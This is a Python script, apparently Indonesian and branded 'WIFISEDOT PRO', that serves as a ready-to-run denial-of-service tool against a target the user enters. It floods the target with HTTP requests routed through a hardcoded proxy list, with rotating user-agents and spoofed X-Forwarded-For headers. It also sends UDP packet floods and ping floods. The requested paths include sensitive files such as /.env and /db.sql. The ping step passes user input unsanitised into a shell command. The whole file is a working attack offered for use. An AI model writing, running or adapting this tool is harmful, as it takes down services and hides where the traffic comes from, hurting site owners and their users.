#!/usr/bin/env python3
import requests
import threading
import random
import time
import socket
import os
import sys
from urllib.parse import urlparse

# Warna
G = '\033[92m'
R = '\033[91m'
Y = '\033[93m'
C = '\033[96m'
W = '\033[0m'

os.system('clear')

# Banner
banner = f"""
{C}╔═══════════════════════════════════════════════════════╗
║            🔥 WIFISEDOT PRO - BARZZ_BOT 🔥             ║
║         Created by : @Barxzzz                          ║
║         Mode       : Multi-Attack (HTTP/UDP/ICMP)     ║
╚═══════════════════════════════════════════════════════╝{W}
"""
print(banner)

# Input
target = input(f"{G}[?] IP / Domain target: {W}")
port = int(input(f"{G}[?] Port (80/443/53): {W}") or 80)
threads = int(input(f"{G}[?] Jumlah thread (50-1000): {W}") or 200)
durasi = int(input(f"{G}[?] Durasi (detik): {W}") or 120)
mode = input(f"{G}[?] Mode (http/udp/icmp/all): {W}").lower() or "all"

# Proxy list (gratis)
proxy_list = [
    "http://103.150.102.2:8080",
    "http://103.150.102.3:8080",
    "http://103.150.102.4:8080",
    "http://103.150.102.5:8080",
    "http://103.150.102.6:8080",
    "http://103.150.102.7:8080",
    "http://103.150.102.8:8080",
    "http://103.150.102.9:8080",
    "http://103.150.102.10:8080",
    "http://103.150.102.11:8080",
    "http://103.150.102.12:8080",
    "http://103.150.102.13:8080",
    "http://103.150.102.14:8080",
    "http://103.150.102.15:8080"
]

# User-Agent acak
uas = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36",
]

# Path acak
paths = [
    "/", "/index.html", "/cgi-bin/", "/admin/", "/login",
    "/status", "/wifi", "/config", "/reboot", "/api/v1/status",
    "/wp-admin", "/phpmyadmin", "/cpanel", "/webmail",
    "/.env", "/backup.zip", "/config.php", "/db.sql"
]

# Variabel global
stop = False
counter_http = 0
counter_udp = 0
counter_icmp = 0
lock = threading.Lock()

# ========== HTTP ATTACK ==========
def http_attack():
    global counter_http
    while not stop:
        try:
            url = f"http://{target}:{port}{random.choice(paths)}"
            ua = random.choice(uas)
            proxy = random.choice(proxy_list) if random.random() > 0.5 else None

            headers = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }

            if proxy:
                r = requests.get(url, headers=headers, proxies={"http": proxy, "https": proxy}, timeout=5)
            else:
                r = requests.get(url, headers=headers, timeout=5)

            with lock:
                counter_http += 1
                print(f"{G}[HTTP] #{counter_http} OK | Size: {len(r.content)} bytes{W}")

        except Exception as e:
            with lock:
                counter_http += 1
                print(f"{Y}[HTTP] #{counter_http} Error: {str(e)[:25]}{W}")
        time.sleep(random.uniform(0.01, 0.05))

# ========== UDP ATTACK ==========
def udp_attack():
    global counter_udp
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop:
        try:
            data = random._urandom(1024)  # 1KB random data
            sock.sendto(data, (target, port))
            with lock:
                counter_udp += 1
                print(f"{C}[UDP] #{counter_udp} sent to {target}:{port}{W}")
        except Exception as e:
            with lock:
                counter_udp += 1
                print(f"{R}[UDP] Error: {str(e)[:25]}{W}")
        time.sleep(random.uniform(0.001, 0.01))

# ========== ICMP (PING FLOOD) ==========
def icmp_attack():
    global counter_icmp
    while not stop:
        try:
            # Kirim ping (ICMP) via subprocess
            os.system(f"ping -c 1 {target} > /dev/null 2>&1")
            with lock:
                counter_icmp += 1
                print(f"{Y}[ICMP] #{counter_icmp} ping sent{W}")
        except:
            pass
        time.sleep(0.01)

# ========== MAIN ==========
print(f"\n{G}[+] Target: {target}:{port}{W}")
print(f"{G}[+] Threads: {threads}{W}")
print(f"{G}[+] Durasi: {durasi} detik{W}")
print(f"{G}[+] Mode: {mode.upper()}{W}")
print(f"{G}[+] Proxy aktif: {len(proxy_list)} proxy{W}\n")
print(f"{G}[+] Tekan CTRL+C untuk stop{W}\n")

# Jalankan thread sesuai mode
if mode in ["http", "all"]:
    for _ in range(threads // 3 if mode == "all" else threads):
        t = threading.Thread(target=http_attack)
        t.daemon = True
        t.start()

if mode in ["udp", "all"]:
    for _ in range(threads // 3 if mode == "all" else threads):
        t = threading.Thread(target=udp_attack)
        t.daemon = True
        t.start()

if mode in ["icmp", "all"]:
    for _ in range(threads // 3 if mode == "all" else threads):
        t = threading.Thread(target=icmp_attack)
        t.daemon = True
        t.start()

# Timer
time.sleep(durasi)
stop = True

# Report
print(f"\n{G}═══════════════════════════════════════════════════════{W}")
print(f"{G}[✓] SERANGAN SELESAI{W}")
print(f"{G}[✓] HTTP  : {counter_http} request{W}")
print(f"{G}[✓] UDP   : {counter_udp} paket{W}")
print(f"{G}[✓] ICMP  : {counter_icmp} ping{W}")
print(f"{G}[✓] TOTAL : {counter_http + counter_udp + counter_icmp} paket{W}")
print(f"{G}═══════════════════════════════════════════════════════{W}")
